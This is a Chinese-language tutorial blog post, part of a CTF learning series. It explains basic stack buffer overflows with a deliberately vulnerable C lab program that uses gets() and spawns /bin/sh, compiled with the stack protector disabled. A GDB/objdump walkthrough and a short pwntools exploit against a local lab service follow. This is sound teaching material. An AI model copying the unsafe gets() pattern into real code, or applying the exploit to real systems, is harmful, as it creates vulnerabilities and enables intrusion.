---
title: "Day6－Basic buffer overflow"
date: 2024-09-06
draft: false
tags: ["iron-man-2024", "pwn", "binary-exploitation"]
categories: ["security-research"]
author: "YJK"
showToc: true
TocOpen: false
---


## [Lab 網址](https://github.com/YJK0805/PWN-CTF-note/)

## 前言

經歷了前面的許多基礎知識與工具介紹，終於來到了第一個漏洞與第一個 lab。而這個漏洞可以說是最簡單也最基本的，就是 **Buffer Overflow**。

## 介紹

首先，先來看一個簡單例子。假如一個程式宣告了一些變數及字串，記憶體中的狀態可能會是下圖的樣子：

![image](https://hackmd.io/_uploads/HJzgm5OhR.png)

如果對 `buf` 字串輸入正常大小的資料，例如這邊宣告的空間是 0x10（16 bytes），輸入 0x10 個 'A'，記憶體狀態可能會像下圖這樣：

![image](https://hackmd.io/_uploads/ByVt7cO2A.png)

然而，當使用一些不安全的函式來輸入數據時，例如 `gets` 函式，可能會產生問題。因為 `gets` 不會檢查輸入的長度，因此可能會覆蓋到 `buf` 後面的變數，甚至是 `rbp` 或 `return address`。以下例子顯示了覆蓋到後面變數 `num3` 和 `num4` 的情況：

![image](https://hackmd.io/_uploads/H12fEqd2R.png)

如果對填入的值進行精確的編排，則可能成為如下所示的情況：

![image](https://hackmd.io/_uploads/HkmLV5_2C.png)

這就是最基本的 **Buffer Overflow** 例子。

## Lab

查看以下程式原始碼

```c=
#include<stdio.h>
int main(){
    setvbuf(stdout, 0, 2, 0);
    setvbuf(stdin, 0, 2, 0);
    setvbuf(stderr, 0, 2, 0);
    int a = 10;
    printf("Please input your name: ");
    char b[10];
    gets(b);
    if(a == 0xdeadbeef){
        system("/bin/sh");
    }
    printf("Hello, %s\n", b);
    return 0;
}
```

使用以下指令進行編譯

```sh=
gcc ./src/bof.c -o ./bof/share/bof -fno-stack-protector
```

大家可以先行使用 GDB 搭配 pwntools 實作題目。如果想提前了解解答，可以繼續閱讀本文中的解說。

## writeup

可以發現程式在第 9 行使用了上面提到的 `gets` 函式來讀取 `b` 字串。接下來，有一個判斷條件是檢查變數 `a` 是否等於 `0xdeadbeef`，如果相等，則會開啟一個 shell。因此，我們的目標有以下兩點：

- 找出需要填充多少字元才能將 `a` 覆蓋為 `0xdeadbeef`。
- 如何將值覆蓋成 `0xdeadbeef`。
為了解決第一個問題，我們可以使用 `objdump` 來 disassemble 程式。會發現在 `gets` 函式之前，程式會為 `buf` 分配空間，對 `lea rax,[rbp-0xe]` 記憶體進行操作。接著，在輸入結束後，程式會使用 `cmp DWORD PTR [rbp-0x4],0xdeadbeef` 進行比較。這告訴我們填充的字元數量是 `0xe - 0x4 = 0xa`，即 10 個字元。

![image](https://hackmd.io/_uploads/HkWpIc_n0.png)

當然，除了使用 `objdump` 進行 disassemble 外，也可以使用 GDB 直接觀察程式。首先，使用 GDB 啟動程式（如 `gdb ./bof`），設置斷點在 `main` 函式處（`b main`），並執行程式（`r`）。接著，逐步執行程式（`ni`），直到輸入字串處。這時，我們可以輸入有規律的字元，觀察覆蓋位置，例如輸入 AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJ。

![image](https://hackmd.io/_uploads/ry2au5O3R.png)

輸入後，我們可以檢查記憶體中的值，會發現覆蓋了兩個 `0x43` 和四個 `0x44`，即 `CCDDDD`。依照剛剛的輸入字串，發現我們需要覆蓋 `AAAABBBBCC`，也就是 `10` 個字元。

![image](https://hackmd.io/_uploads/HywuYqdnR.png)

接下來，我們需要使用 `pwntools` 將 `0xdeadbeef` 覆蓋到適當的位置。使用 `checksec` 可以確認這個檔案是 64 位元，這樣我們就可以使用 `p64()` 來將 `0xdeadbeef` 轉換成 `64` 位格式並覆蓋變數。

![image](https://hackmd.io/_uploads/Sk_Y5qO3A.png)

以下會發現我有留了一行遠端連線的程式碼，這是因為筆者的檔案有附上 docker-compose.yml 跟 DockerFile 跟 xinetd，所以可以讓讀者將題目架起來並實際做練習

完整 exploit：

```py=
from pwn import *
# r = process('./bof')
r = remote('127.0.0.1', 10000)
r.sendlineafter(b'Please input your name: ', b'AAAAAAAAAA' + p64(0xdeadbeef))
r.interactive()
```

以下是將題目實際架起來並拿到 flag 的結果

solved！！

![image](https://hackmd.io/_uploads/rkH-pquhR.png)
